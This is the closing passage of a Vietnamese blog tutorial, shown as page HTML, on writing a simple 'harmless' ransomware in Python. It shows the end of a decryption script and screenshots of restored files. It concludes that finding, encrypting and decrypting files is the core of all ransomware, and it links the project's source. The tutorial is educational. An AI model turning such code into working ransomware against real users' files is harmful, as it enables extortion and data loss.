</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã được giải mã!&#34;</span>)
</span></span></code></pre></div><p>Sau khi chúng ta chạy chương trình này, chúng ta có thể đọc lại nội dung gốc của các file đã bị mã hóa.</p>
<p><img alt="file1-decrypted" src="/img/harmless-ransomware/file1-decrypted.png"></p>
<p>Chúng ta cũng có thể xem lại các file ảnh và video.</p>
<p><img alt="pic-decrypted" src="/img/harmless-ransomware/pic-decrypted.png"></p>
<hr>
<h1 id="kết-luận">Kết luận</h1>
<p>Đó là 2 chương trình mã hóa và giải mã. 2 chương trình đó sẽ kết hợp lại thành 1 con <em>ransomware</em>. Đây chỉ là con ransomware rất đơn giản và vô hại, nếu như nạn nhân có 1 ít kiến thức về mã hóa và giải mã thì họ sẽ không có vấn đề gì trong việc giải mã các file bị mã hóa.</p>
<p>Nhưng lõi của con ransomware cũng giống như lõi của các con ransomware khác: Khả năng <em>tìm</em> và <em>mã hóa</em> các file trên máy tính và khả năng <em>giải mã</em> các file đó.</p>
<p>Đó là cách vận hành của mọi ransomware.</p>
<blockquote>
<p>Bạn có thể đọc mã nguồn của dự án này tại <a href="https://github.com/namberino/simple-ransomware">đây</a></p>
</blockquote>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://namberino.github.io/en/tags/l%E1%BA%ADp-tr%C3%ACnh/">lập trình</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/hack/">hack</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/b%E1%BA%A3o-m%E1%BA%ADt/">bảo mật</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>





    </body>
</html>
